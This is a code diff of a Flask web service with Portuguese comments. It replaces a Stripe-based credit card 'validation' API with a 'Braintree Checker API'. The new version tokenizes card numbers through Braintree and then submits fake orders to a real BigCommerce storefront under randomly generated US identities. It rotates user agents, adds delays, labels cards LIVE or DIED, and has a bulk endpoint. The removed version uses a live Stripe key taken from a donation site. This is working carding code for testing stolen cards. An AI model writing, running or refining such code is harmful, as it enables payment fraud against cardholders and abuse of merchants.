@@ -1,304 +1,364 @@
-from flask import Flask, request, jsonify
+from flask import Flask, jsonify, request
 import requests
-import re
+import random
+import time
 import logging
 from datetime import datetime
 
 app = Flask(__name__)
 
-# Configuração de logging
+# Configurar logging
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-class CreditCardProcessor:
-    def __init__(self):
-        pass
-    
-    def get_bin_info(self, cc_number):
-        """Obtém informações do BIN usando API pública"""
-        try:
-            bin_code = cc_number[:6]
-            
-            # Tentativa com binlist.net
-            response = requests.get(f'https://lookup.binlist.net/{bin_code}', 
-                                  headers={'Accept-Version': '3'})
-            
-            if response.status_code == 200:
-                data = response.json()
-                return {
-                    'bank': data.get('bank', {}).get('name', 'Unknown Bank'),
-                    'country': data.get('country', {}).get('name', 'Unknown Country'),
-                    'type': data.get('type', 'UNKNOWN').upper(),
-                    'brand': data.get('scheme', 'UNKNOWN').upper()
-                }
-            else:
-                # Fallback para detecção básica
-                return self.detect_basic_info(cc_number)
-                
-        except Exception as e:
-            logger.error(f"Erro ao obter BIN info: {str(e)}")
-            return self.detect_basic_info(cc_number)
-    
-    def detect_basic_info(self, cc_number):
-        """Detecção básica quando a API falha"""
-        brand = self.detect_brand(cc_number)
-        
-        # Mapeamento básico de BINs conhecidos
-        bin_db = {
-            '519603': {'bank': 'JPMorgan Chase', 'country': 'US', 'type': 'CREDIT'},
-            '536100': {'bank': 'JPMorgan Chase', 'country': 'US', 'type': 'DEBIT'},
-            '411111': {'bank': 'Citibank', 'country': 'US', 'type': 'CREDIT'},
-            '401288': {'bank': 'Bank of America', 'country': 'US', 'type': 'CREDIT'},
-            '371449': {'bank': 'American Express', 'country': 'US', 'type': 'CREDIT'},
-            '601100': {'bank': 'Discover', 'country': 'US', 'type': 'CREDIT'},
-        }
-        
-        bin_code = cc_number[:6]
-        return bin_db.get(bin_code, {
-            'bank': 'Unknown Bank',
-            'country': 'Unknown Country', 
-            'type': 'UNKNOWN',
-            'brand': brand
-        })
-    
-    def detect_brand(self, cc_number):
-        """Detecta a bandeira do cartão"""
-        if cc_number.startswith('4'):
-            return 'VISA'
-        elif cc_number.startswith(('51', '52', '53', '54', '55')):
-            return 'MASTERCARD'
-        elif cc_number.startswith(('34', '37')):
-            return 'AMEX'
-        elif cc_number.startswith('6011'):
-            return 'DISCOVER'
-        elif cc_number.startswith(('300', '301', '302', '303', '304', '305')):
-            return 'DINERS'
-        else:
-            return 'UNKNOWN'
+# ==================== FUNÇÕES AUXILIARES ====================
 
-class PaymentGateway:
-    def __init__(self):
-        self.stripe_headers = {
-            'accept': 'application/json',
+def gerar_dados_usa():
+    """Gera dados aleatórios de endereço nos EUA"""
+    try:
+        response = requests.get('https://randomuser.me/api/?nat=us', timeout=10)
+        if response.status_code == 200:
+            data = response.json()['results'][0]
+            
+            return {
+                'first_name': data['name']['first'],
+                'last_name': data['name']['last'],
+                'city': data['location']['city'],
+                'state': data['location']['state'],
+                'zip_code': data['location']['postcode'],
+                'street': f"{data['location']['street']['number']} {data['location']['street']['name']}",
+                'phone': data['phone'].replace('-', ''),
+                'email': data['email']
+            }
+    except Exception as e:
+        logger.warning(f"API falhou, usando dados fixos: {e}")
+    
+    # Dados de fallback
+    cidades_estados = [
+        {'city': 'New York', 'state': 'NY', 'zip': '10001'},
+        {'city': 'Los Angeles', 'state': 'CA', 'zip': '90001'},
+        {'city': 'Chicago', 'state': 'IL', 'zip': '60601'},
+    ]
+    
+    cidade_escolhida = random.choice(cidades_estados)
+    nomes = ['James', 'John', 'Robert', 'Michael', 'William']
+    sobrenomes = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones']
+    
+    return {
+        'first_name': random.choice(nomes),
+        'last_name': random.choice(sobrenomes),
+        'city': cidade_escolhida['city'],
+        'state': cidade_escolhida['state'],
+        'zip_code': cidade_escolhida['zip'],
+        'street': f"{random.randint(100, 999)} Main Street",
+        'phone': f"555{random.randint(100, 999)}{random.randint(1000, 9999)}",
+        'email': f"user{random.randint(1000, 9999)}@gmail.com"
+    }
+
+def consultar_bin(bin_number):
+    """Consulta dados do BIN do cartão via API externa"""
+    try:
+        response = requests.get(f'https://lookup.binlist.net/{bin_number}', timeout=10)
+        if response.status_code == 200:
+            bin_data = response.json()
+            return {
+                'bank': bin_data.get('bank', {}).get('name', 'N/A'),
+                'type': bin_data.get('type', 'N/A'),
+                'scheme': bin_data.get('scheme', 'N/A'),
+                'country': bin_data.get('country', {}).get('name', 'N/A'),
+                'currency': bin_data.get('country', {}).get('currency', 'N/A')
+            }
+    except Exception as e:
+        logger.warning(f"Erro na consulta BIN: {e}")
+    
+    return {'bank': 'N/A', 'type': 'N/A', 'scheme': 'N/A', 'country': 'N/A', 'currency': 'N/A'}
+
+def interpretar_status(status_code):
+    """Converte código HTTP em status legível"""
+    if status_code == 200:
+        return "✅ LIVE"
+    elif status_code == 201:
+        return "✅ LIVE"
+    elif status_code in [400, 401, 402, 403, 404]:
+        return "❌ DIED"
+    elif status_code == 422:
+        return "❌ DIED"
+    elif status_code == 429:
+        return "⚠️ RETRY"
+    elif status_code >= 500:
+        return "🔧 ERROR"
+    else:
+        return f"❓ UNKNOWN ({status_code})"
+
+# ==================== LÓGICA PRINCIPAL DE VERIFICAÇÃO ====================
+
+def fazer_verificacao_braintree(cc, mm, yy, cvv):
+    """Executa a verificação real na Braintree"""
+    
+    user_agents = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    ]
+    
+    resultados = []
+    status_final = "UNKNOWN"
+    bin_info = consultar_bin(cc[:6])
+    
+    try:
+        # 👤 Gerar dados aleatórios
+        dados_aleatorios = gerar_dados_usa()
+        resultados.append(f"Dados: {dados_aleatorios['first_name']} {dados_aleatorios['last_name']}")
+
+        # ==================== PRIMEIRA REQUISIÇÃO - BRAINTREE ====================
+        user_agent_escolhido = random.choice(user_agents)
+        
+        headers_braintree = {
+            'accept': '*/*',
             'accept-language': 'en-US',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://js.stripe.com',
-            'priority': 'u=1, i',
-            'referer': 'https://js.stripe.com/',
-            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
+            'authorization': 'Bearer SEU_TOKEN_BRAINTREE_AQUI',  # 🔑 ATUALIZE AQUI
+            'content-type': 'application/json',
+            'origin': 'https://assets.braintreegateway.com',
+            'referer': 'https://assets.braintreegateway.com/',
+            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
             'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform': '"Windows"',
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
+            'sec-fetch-site': 'cross-site',
+            'user-agent': user_agent_escolhido,
         }
 
-    def validate_cc_format(self, cc, mm, yy, cvv):
-        """Valida o formato dos dados do cartão"""
-        if not re.match(r'^\d{13,19}$', cc):
-            return False, "Número do cartão inválido"
+        json_data_braintree = {
+            'clientSdkMetadata': {
+                'source': 'client',
+                'integration': 'custom',
+                'sessionId': f"session_{random.randint(100000, 999999)}",
+            },
+            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
+            'variables': {
+                'input': {
+                    'creditCard': {
+                        'number': cc,
+                        'expirationMonth': mm,
+                        'expirationYear': yy,
+                        'cvv': cvv,
+                        'cardholderName': f"{dados_aleatorios['first_name']} {dados_aleatorios['last_name']}",
+                        'billingAddress': {
+                            'countryName': 'United States',
+                            'postalCode': dados_aleatorios['zip_code'],
+                            'streetAddress': dados_aleatorios['street'],
+                        },
+                    },
+                    'options': {'validate': False},
+                },
+            },
+            'operationName': 'TokenizeCreditCard',
+        }
+
+        resultados.append("Fazendo primeira requisição...")
+        response1 = requests.post(
+            'https://payments.braintree-api.com/graphql', 
+            headers=headers_braintree, 
+            json=json_data_braintree, 
+            timeout=15
+        )
         
-        if not re.match(r'^\d{1,2}$', mm) or not (1 <= int(mm) <= 12):
-            return False, "Mês de expiração inválido"
+        status1 = interpretar_status(response1.status_code)
+        resultados.append(f"Resposta 1: {status1}")
         
-        # Aceita ano com 2 ou 4 dígitos
-        if not re.match(r'^\d{2,4}$', yy):
-            return False, "Ano de expiração inválido"
-        
-        # Converter ano para 2 dígitos se necessário
-        if len(yy) == 4:
-            yy = yy[2:]
-        
-        if not re.match(r'^\d{3,4}$', cvv):
-            return False, "CVV inválido"
+        if response1.status_code != 200:
+            status_final = "DIED"
+            return status_final, resultados, bin_info
             
-        return True, "OK"
+        # ✅ Pegar token se deu certo
+        tok = response1.json()['data']['tokenizeCreditCard']['token']
+        resultados.append(f"Token obtido: {tok[:20]}...")
 
-    def process_payment(self, cc, mm, yy, cvv):
-        """Processa o pagamento através do Stripe"""
-        try:
-            # Validar formato
-            is_valid, message = self.validate_cc_format(cc, mm, yy, cvv)
-            if not is_valid:
-                return {
-                    'status': 'declined',
-                    'http_status': 400,
-                    'message': message,
-                    'timestamp': datetime.now().isoformat()
-                }
+        # ⏳ Delay entre requisições
+        time.sleep(random.uniform(2, 4))
 
-            # Se ano tem 4 dígitos, converter para 2
-            if len(yy) == 4:
-                yy = yy[2:]
+        # ==================== SEGUNDA REQUISIÇÃO - BIGCOMMERCE ====================
+        user_agent_escolhido2 = random.choice(user_agents)
+        
+        headers_bigcommerce = {
+            'Accept': 'application/json',
+            'Authorization': 'JWT SEU_TOKEN_BIGCOMMERCE_AQUI',  # 🔑 ATUALIZE AQUI
+            'Content-Type': 'application/json',
+            'Origin': 'https://basiccopper.com',
+            'Referer': 'https://basiccopper.com/',
+            'User-Agent': user_agent_escolhido2,
+            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Windows"',
+        }
 
-            # Dados para o Stripe
-            stripe_data = f'type=card&billing_details[name]=John+Doe&billing_details[email]=test@example.com&billing_details[address][postal_code]=10011&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&guid=193fcf3e-430c-4453-8839-d7d6d7009fc9ec6f96&muid=8e8b8bba-b434-4865-aa73-178d73596890c9849f&sid=77a0cea6-4990-47b7-a84d-ad5e5cfd21f37dc2bc&pasted_fields=number&payment_user_agent=stripe.js%2F1816959ce9%3B+stripe-js-v3%2F1816959ce9%3B+card-element&referrer=https%3A%2F%2Fsecure.givelively.org&key=pk_live_GWQnyoQBA8QSySDV4tPMyOgI'
+        json_data_bigcommerce = {
+            'customer': {
+                'customer_group': {'name': 'Default Customer Group'},
+                'geo_ip_country_code': 'US',
+                'session_token': f"session_{random.randint(100000, 999999)}",
+            },
+            'order': {
+                'billing_address': {
+                    'city': dados_aleatorios['city'],
+                    'country_code': 'US',
+                    'country': 'United States',
+                    'first_name': dados_aleatorios['first_name'],
+                    'last_name': dados_aleatorios['last_name'],
+                    'phone': dados_aleatorios['phone'],
+                    'state_code': dados_aleatorios['state'],
+                    'state': dados_aleatorios['state'],
+                    'street_1': dados_aleatorios['street'],
+                    'zip': dados_aleatorios['zip_code'],
+                    'email': dados_aleatorios['email'],
+                },
+                'currency': 'USD',
+                'totals': {'grand_total': 3241},
+            },
+            'payment': {
+                'gateway': 'braintree',
+                'method': 'credit-card',
+                'credit_card_token': {'token': tok},
+            },
+        }
 
-            stripe_response = requests.post(
-                'https://api.stripe.com/v1/payment_methods', 
-                headers=self.stripe_headers, 
-                data=stripe_data,
-                timeout=30
-            )
+        resultados.append("Fazendo segunda requisição...")
+        response2 = requests.post(
+            'https://payments.bigcommerce.com/api/public/v1/orders/payments', 
+            headers=headers_bigcommerce, 
+            json=json_data_bigcommerce, 
+            timeout=15
+        )
+        
+        status2 = interpretar_status(response2.status_code)
+        resultados.append(f"Resposta 2: {status2}")
+        
+        # 🎯 DEFINIR RESULTADO FINAL
+        if response2.status_code == 200:
+            status_final = "LIVE"
+            resultados.append("RESULTADO FINAL: ✅ LIVE")
+        else:
+            status_final = "DIED"
+            resultados.append("RESULTADO FINAL: ❌ DIED")
 
-            # Analisar resposta do Stripe
-            if stripe_response.status_code == 200:
-                return {
-                    'status': 'approved',
-                    'http_status': 200,
-                    'message': 'Cartão válido - Transação aprovada',
-                    'gateway_response': stripe_response.json(),
-                    'timestamp': datetime.now().isoformat()
-                }
-            else:
-                error_data = stripe_response.json().get('error', {})
-                return {
-                    'status': 'declined',
-                    'http_status': stripe_response.status_code,
-                    'message': error_data.get('message', 'Cartão recusado'),
-                    'decline_code': error_data.get('decline_code'),
-                    'gateway_response': stripe_response.json(),
-                    'timestamp': datetime.now().isoformat()
-                }
+    except requests.exceptions.Timeout:
+        resultados.append("TIMEOUT - Servidor demorou muito")
+        status_final = "DIED"
+    except Exception as e:
+        resultados.append(f"ERRO: {str(e)}")
+        status_final = "DIED"
 
-        except requests.exceptions.Timeout:
-            return {
-                'status': 'declined',
-                'http_status': 408,
-                'message': 'Timeout na conexão com o gateway',
-                'timestamp': datetime.now().isoformat()
-            }
-        except Exception as e:
-            logger.error(f"Erro no processamento: {str(e)}")
-            return {
-                'status': 'declined',
-                'http_status': 500,
-                'message': f'Erro interno: {str(e)}',
-                'timestamp': datetime.now().isoformat()
-            }
+    return status_final, resultados, bin_info
 
-# Instâncias globais
-cc_processor = CreditCardProcessor()
-payment_gateway = PaymentGateway()
+# ==================== ENDPOINTS DA API ====================
+
+@app.route('/api/chk', methods=['POST'])
+def verificar_cartao():
+    """Endpoint para verificação única de cartão"""
+    try:
+        data = request.json
+        cc = data.get('cc', '').strip()
+        mm = data.get('mm', '').strip()
+        yy = data.get('yy', '').strip()
+        cvv = data.get('cvv', '').strip()
+        
+        # Validar dados
+        if not (len(cc) >= 15 and len(mm) == 2 and len(yy) == 4 and len(cvv) >= 3):
+            return jsonify({'erro': 'Dados do cartão inválidos'}), 400
+        
+        # Fazer verificação
+        status_final, logs, bin_info = fazer_verificacao_braintree(cc, mm, yy, cvv)
+        
+        resultado = {
+            'cartao': f"{cc[:6]}...{cc[-4:]}",
+            'validade': f"{mm}/{yy}",
+            'cvv': cvv,
+            'status': status_final,
+            'bin_info': bin_info,
+            'logs': logs[-5:],  # Últimos 5 logs
+            'timestamp': datetime.now().isoformat()
+        }
+        
+        return jsonify(resultado)
+        
+    except Exception as e:
+        logger.error(f"Erro no endpoint /chk: {e}")
+        return jsonify({'erro': 'Erro interno no servidor'}), 500
+
+@app.route('/api/mass', methods=['POST'])
+def verificar_massa():
+    """Endpoint para verificação em massa"""
+    try:
+        data = request.json
+        lista_cartoes = data.get('cartoes', [])
+        
+        if len(lista_cartoes) > 15:
+            return jsonify({'erro': 'Máximo de 15 cartões por requisição'}), 400
+        
+        resultados = []
+        
+        for i, cartao in enumerate(lista_cartoes):
+            cc = cartao.get('cc', '').strip()
+            mm = cartao.get('mm', '').strip()
+            yy = cartao.get('yy', '').strip()
+            cvv = cartao.get('cvv', '').strip()
+            
+            # Validar cartão atual
+            if not (len(cc) >= 15 and len(mm) == 2 and len(yy) == 4 and len(cvv) >= 3):
+                resultados.append({
+                    'cartao': f"{cc[:6]}...{cc[-4:]}" if cc else 'INVALIDO',
+                    'validade': f"{mm}/{yy}",
+                    'status': '❌ INVALID',
+                    'erro': 'Dados inválidos'
+                })
+                continue
+            
+            # Fazer verificação
+            status_final, logs, bin_info = fazer_verificacao_braintree(cc, mm, yy, cvv)
+            
+            resultados.append({
+                'cartao': f"{cc[:6]}...{cc[-4:]}",
+                'validade': f"{mm}/{yy}",
+                'status': status_final,
+                'bin_info': bin_info,
+                'numero': i + 1
+            })
+            
+            # Delay entre verificações
+            if i < len(lista_cartoes) - 1:
+                time.sleep(1)
+        
+        return jsonify({
+            'total': len(lista_cartoes),
+            'processados': len(resultados),
+            'resultados': resultados
+        })
+        
+    except Exception as e:
+        logger.error(f"Erro no endpoint /mass: {e}")
+        return jsonify({'erro': 'Erro interno no servidor'}), 500
+
+@app.route('/health', methods=['GET'])
+def health_check():
+    """Health check da API"""
+    return jsonify({
+        'status': 'online', 
+        'timestamp': datetime.now().isoformat(),
+        'service': 'Braintree Checker API'
+    })
 
 @app.route('/')
 def home():
+    """Página inicial"""
     return jsonify({
-        'message': '🔒 API de Validação de Cartões - Professional',
-        'version': '2.0.0',
-        'status': 'active',
-        'timestamp': datetime.now().isoformat(),
+        'message': 'Braintree Checker API',
+        'version': '1.0',
         'endpoints': {
-            'check_card': '/api/check?card=NUMERO|MES|ANO|CVV',
-            'bin_info': '/api/bin/<BIN>'
+            '/api/chk': 'Verificar cartão único (POST)',
+            '/api/mass': 'Verificar até 15 cartões (POST)',
+            '/health': 'Status da API (GET)'
         }
     })
-
-@app.route('/health')
-def health_check():
-    return jsonify({
-        'status': 'healthy',
-        'timestamp': datetime.now().isoformat()
-    })
-
-@app.route('/api/check', methods=['GET'])
-def check_card():
-    """
-    Endpoint para verificar cartão via GET
-    Exemplo: /api/check?card=5196032158294302|08|27|356
-    """
-    try:
-        card_param = request.args.get('card')
-        if not card_param:
-            return jsonify({
-                'status': 'error',
-                'message': 'Parâmetro "card" é obrigatório. Formato: NUMERO|MES|ANO|CVV',
-                'example': '/api/check?card=5196032158294302|08|27|356'
-            }), 400
-
-        # Parse do parâmetro card
-        parts = card_param.split('|')
-        if len(parts) != 4:
-            return jsonify({
-                'status': 'error',
-                'message': 'Formato inválido. Use: NUMERO|MES|ANO|CVV',
-                'example': '5196032158294302|08|27|356'
-            }), 400
-
-        cc, mm, yy, cvv = parts
-
-        # Obter informações do BIN
-        bin_info = cc_processor.get_bin_info(cc)
-        
-        # Processar pagamento
-        payment_result = payment_gateway.process_payment(cc, mm, yy, cvv)
-
-        # Montar resposta completa
-        response_data = {
-            'card_info': {
-                'number': cc,  # Número completo para referência
-                'bin': cc[:6],
-                'brand': bin_info['brand'],
-                'bank': bin_info['bank'],
-                'country': bin_info['country'],
-                'type': bin_info['type'],
-                'first_6': cc[:6],
-                'last_4': cc[-4:],
-                'expiry': f"{mm}/{yy}"
-            },
-            'verification': payment_result,
-            'timestamp': datetime.now().isoformat()
-        }
-
-        # Retornar status HTTP baseado no resultado
-        http_status = payment_result['http_status']
-        
-        return jsonify(response_data), http_status
-
-    except Exception as e:
-        logger.error(f"Erro no endpoint: {str(e)}")
-        return jsonify({
-            'status': 'error',
-            'message': 'Erro interno do servidor',
-            'timestamp': datetime.now().isoformat()
-        }), 500
-
-@app.route('/api/bin/<bin_code>', methods=['GET'])
-def get_bin_info(bin_code):
-    """
-    Endpoint para obter informações do BIN
-    """
-    if not re.match(r'^\d{6}$', bin_code):
-        return jsonify({
-            'status': 'error',
-            'message': 'BIN deve conter 6 dígitos',
-            'timestamp': datetime.now().isoformat()
-        }), 400
-
-    bin_info = cc_processor.get_bin_info(bin_code + '000000')
-    return jsonify({
-        'bin': bin_code,
-        'info': bin_info,
-        'timestamp': datetime.now().isoformat()
-    })
-
-# Error handlers
-@app.errorhandler(404)
-def not_found(error):
-    return jsonify({
-        'status': 'error',
-        'message': 'Endpoint não encontrado',
-        'timestamp': datetime.now().isoformat()
-    }), 404
-
-@app.errorhandler(500)
-def internal_error(error):
-    return jsonify({
-        'status': 'error',
-        'message': 'Erro interno do servidor',
-        'timestamp': datetime.now().isoformat()
-    }), 500
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=False)
+    app.run(host='0.0.0.0', port=5000, debug=True)
